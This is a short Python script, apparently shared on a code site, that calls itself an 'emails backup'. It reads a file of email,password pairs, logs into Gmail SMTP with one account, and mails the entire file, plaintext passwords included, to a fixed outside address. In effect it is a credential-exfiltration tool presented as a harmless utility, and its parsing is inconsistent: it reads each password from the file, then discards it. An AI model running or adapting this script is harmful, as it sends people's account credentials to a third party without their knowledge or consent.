#Don't forget to put a star
import os
import smtplib
import getpass
import keyring


EMAILS_FILE = "emails.txt"


TO_EMAIL = "example@example.com"


emails = []
passwords = []
with open(EMAILS_FILE, "r") as f:
    for line in f:
        email, password = line.strip().split(",")
        emails.append(email)
        passwords.append(keyring.get_password("email_passwords", email))


smtp_server = "smtp.gmail.com"  
smtp_port = 587  
email_index = 0  
email = emails[email_index]
password = passwords[email_index]


smtp = smtplib.SMTP(smtp_server, smtp_port)
smtp.starttls()  
smtp.login(email, password)

with open(EMAILS_FILE, "rb") as f:
    file_data = f.read()

message = f"""\
From: {email}
To: {TO_EMAIL}
Subject: Emails backup

Here is a backup of all the emails on the system.
"""

smtp.sendmail(email, TO_EMAIL, message.encode("utf-8") + file_data)

smtp.quit()

#print("The emails backup file has been sent to", TO_EMAIL)
#@pouryet
